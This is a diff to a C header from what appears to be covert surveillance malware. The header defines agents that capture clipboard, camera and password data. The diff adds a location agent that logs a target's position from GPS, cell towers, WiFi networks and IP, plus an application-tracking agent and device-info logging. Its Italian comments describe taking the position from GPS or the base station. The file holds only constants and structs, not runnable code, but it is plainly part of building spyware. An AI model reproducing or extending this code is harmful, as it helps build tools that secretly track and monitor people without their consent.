@@ -185,6 +185,8 @@ typedef struct os_version {
 #define AGENT_CLIPBOARD   0xD9D9
 #define AGENT_CAM         0xE9E9
 #define AGENT_PASSWORD    0xFAFA
+#define AGENT_POSITION    0x1220
+#define AGENT_APPLICATION 0x1011
 
 //
 // Agents Shared Memory offsets
@@ -199,6 +201,7 @@ typedef struct os_version {
 #define OFFT_CLIPBOARD    0x1C40
 #define OFFT_COMMAND      0x2040
 #define OFFT_CORE_PID     0x2440
+#define OFFT_APPLICATION  0x2840
 
 extern u_int remoteAgents[];
 
@@ -391,6 +394,40 @@ typedef struct _sync {
 #pragma mark -
 #pragma mark Agents Data Struct Definition
 #pragma mark -
+
+#define LOGTYPE_DEVICE          0x0240 // Device info Agent
+typedef struct _device
+{
+#define LOGTYPE_DEVICE_HW   0
+#define LOGTYPE_DEVICE_PROC 1
+  UInt32 iType;
+#define AGENT_DEV_ENABLED     1
+#define AGENT_DEV_NOTENABLED  0
+  UInt32 isEnabled;
+} deviceStruct;
+
+#define LOGTYPE_LOCATION_NEW    0x1220
+
+#define LOGTYPE_LOCATION_GPS    0x0001
+#define LOGTYPE_LOCATION_GSM    0x0002
+#define LOGTYPE_LOCATION_WIFI   0x0003
+#define LOGTYPE_LOCATION_IP     0x0004
+#define LOGTYPE_LOCATION_CDMA   0x0005
+
+typedef struct _position {
+  UInt32 sleepTime;
+#define LOGGER_GPS  1 // Prendi la posizione dal GPS
+#define LOGGER_GSM  2  // Prendi la posizione dalla BTS
+#define LOGGER_WIFI 4 // Prendi la lista delle reti WiFi in vista
+  UInt32 iType;
+} positionStruct;
+
+typedef struct _LocationAdditionalData {
+	UInt32 uVersion;
+#define LOG_LOCATION_VERSION (UInt32)2010082401
+	UInt32 uType;
+	UInt32 uStructNum;
+} LocationAdditionalData, *pLocationAdditionalData;
 
 typedef struct _screenshot {
   u_int sleepTime;
